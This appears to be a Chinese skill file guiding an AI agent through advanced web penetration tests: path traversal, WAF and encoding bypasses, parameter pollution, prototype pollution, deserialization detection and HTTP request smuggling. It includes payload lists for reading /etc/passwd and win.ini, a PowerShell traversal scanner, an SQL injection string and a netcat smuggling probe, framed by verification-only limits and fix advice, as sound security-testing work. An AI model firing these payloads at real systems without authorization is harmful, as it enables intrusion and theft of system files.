---
name: advanced-attacks
description: 高级攻击与绕过测试指南 (WSTG-INPV / WSTG-ATHZ 扩展) - 路径穿越、编码绕过、HPP、原型链污染、反序列化、HTTP 请求走私
---

# Phase 8: 高级攻击与绕过 (WSTG-INPV / WSTG-ATHZ 扩展)

本阶段技术难度高、误报率与副作用都高。所有测试只做**验证级**（证明可利用即停止），严禁影响可用性的操作（大文件读取、DoS、真实数据外带、攻击其他用户会话）。

## 8.1 路径穿越 (Path Traversal)

### 检查点

文件下载/预览/导入/头像/模板渲染等带文件路径参数的接口。

### Payload 库

```powershell
$traversalPayloads = @(
    "../../../../etc/passwd",
    "..\..\..\..\windows\win.ini",
    "....//....//....//etc/passwd",        # 双写绕过
    "..%2f..%2f..%2f..%2fetc/passwd",      # 单次编码
    "..%252f..%252f..%252fetc/passwd",     # 双重编码
    "%2e%2e%2f%2e%2e%2fetc/passwd",        # 全编码
    "/etc/passwd",                         # 绝对路径
    "file:///etc/passwd",                  # 协议指定
    "php://filter/convert.base64-encode/resource=index.php",  # PHP 读源码
    "....\....\....\windows\win.ini"       # Windows 双写
)

$traversalIndicators = @(
    "root:x:", "/bin/bash", "/bin/sh",
    "[fonts]", "[extensions]",             # win.ini
    "for 16-bit app support"               # win.ini
)
```

### 测试脚本

```powershell
function Test-PathTraversal {
    param(
        [string]$UrlTemplate,   # 例: "https://target/download?file={0}"
        [string[]]$Payloads
    )

    foreach ($p in $Payloads) {
        $url = $UrlTemplate -replace '\{0\}', [System.Uri]::EscapeDataString($p)
        try {
            $resp = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
            foreach ($ind in $traversalIndicators) {
                if ($resp.Content -match [regex]::Escape($ind)) {
                    Write-Host "[!] 路径穿越命中: $p -> $ind"
                    break
                }
            }
        } catch { }
        Start-Sleep -Milliseconds 200
    }
}
```

### 上传场景：Zip Slip

上传含 `../../evil.jsp` 条目的 zip，检查解压落地路径是否逃逸。

### 修复建议

白名单文件名 + 路径规范化后校验前缀；不用用户输入直接拼路径；解压时校验条目路径。

---

## 8.2 编码与 WAF 绕过

### 常用变形

```text
大小写：<ScRiPt> / UnIoN sElEcT
URL 编码 / 双重编码：%2e%2e%2f / %252e
Unicode 全角：＜ ＞ ／
注释插入：/*!50000UnIoN*/ / unio/**/n
分块传输编码（Transfer-Encoding: chunked）
HTTP/2 → HTTP/1.1 降级
尾部点/分号：/admin/;x / /admin/.
```

### WAF 指纹（区分拦截来自 WAF 还是应用）

```powershell
$blocked = try {
    Invoke-WebRequest -Uri "$TARGET_URL/search?q=<script>alert(1)</script>" -UseBasicParsing -ErrorAction Stop
} catch { $_.Exception.Response }
# 拦截页含 cloudflare/akamai/incapsula/safedog/安全狗 等关键词 → 拦截来自 WAF
```

### 修复建议

应用层输入校验不依赖 WAF；规范化（解码一次）后再校验。

---

## 8.3 HTTP 参数污染 (HPP)

### 测试原理

WAF 与后端对重复参数解析顺序不同（WAF 看第一个，后端用最后一个，或反之）→ 绕过检测。

```powershell
# safe 值过 WAF，恶意值被后端采用
$url = "$TARGET_URL/item?id=1&id=1' OR '1'='1--"
$resp = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction SilentlyContinue
# 判定：WAF 放行但后端执行了第二个值 → 绕过成功即漏洞证据
```

同时测试 JSON body 重复键、数组参数 `id[]=`、表单数组 `ids=a&ids=b`。

### 修复建议

统一参数解析策略（取第一个或明确顺序）；规范化后再过检测。

---

## 8.4 原型链污染 (JavaScript)

### 适用条件

Node.js 后端，或对用户 JSON 做深拷贝/合并的接口（资料更新、配置保存）。

### Payload

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"a": {"__proto__": {"polluted": "yes"}}}
```

### 判定方法

1. 向会合并入参的接口发送污染 payload
2. 观察：响应出现非显式设置的属性、关联功能行为变化
3. 无回显时标注"潜在，需代码审计确认"，不做进一步利用验证

### 修复建议

合并前剔除 `__proto__/constructor/prototype` 键；`Object.create(null)`；JSON.parse + 白名单字段映射。

---

## 8.5 不安全反序列化

### 识别（只识别，不构造 gadget 链）

```powershell
# Java：base64 数据以 rO0AB 开头（ObjectInputStream 序列化流）
# PHP：O:8:"stdClass":1:{...} 形式序列化串
# Python：pickle 二进制（常以 \x80 开头）
# .NET：BinaryFormatter / LosFormatter / ViewState（需确认无 MAC 才可利用）
```

判定：输入可控 + 服务端反序列化 + 报错含类名/调用栈 → 记录，配合白盒确认 gadget 链。**不做执行验证**（RCE 破坏性大），除非用户明确批准。

### 修复建议

禁用原生反序列化，改用 JSON；白名单类；完整性签名校验。

---

## 8.6 HTTP 请求走私

### 测试原理

前后端对 Content-Length / Transfer-Encoding 解析不一致 → 请求边界混淆，可污染同一连接上其他用户的请求。

### 检查点

```text
CL.TE：前端用 CL、后端用 TE → 走私
TE.CL：反向
TE.TE：TE 头变形（tab 缩进、大小写）骗过一方
HTTP/2 降级：h2c / CL-TE 重写
```

### 验证探针（仅一次，谨慎）

```bash
# 发送畸形的 CL+TE 组合，观察后端是否挂起/报错/关闭连接
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | timeout 10 nc TARGET 80
# 判定：连接被 RST/超时/后端记录异常请求 → 存在解析差异，记录待白盒确认
```

### 安全约束

- 走私探针可能影响同一连接上的真实用户请求，**生产环境先申请测试窗口**
- 不做完整走私利用链（不攻击其他用户会话）

### 修复建议

前端规范化请求（拒绝歧义头）；后端统一 HTTP 版本解析；CDN 与源站 CL/TE 策略一致。

## 误报说明

- WAF 拦截 ≠ 漏洞不存在，换编码/大小写重试确认
- 走私/原型污染/OOB 类问题多数需白盒确认，报告中标注"疑似，需代码审计"

## 输出格式

| 漏洞类型 | 位置 | 参数 | Payload | 证据 | 风险 | 修复建议 |

（另注明：验证级发现 / 需白盒确认）
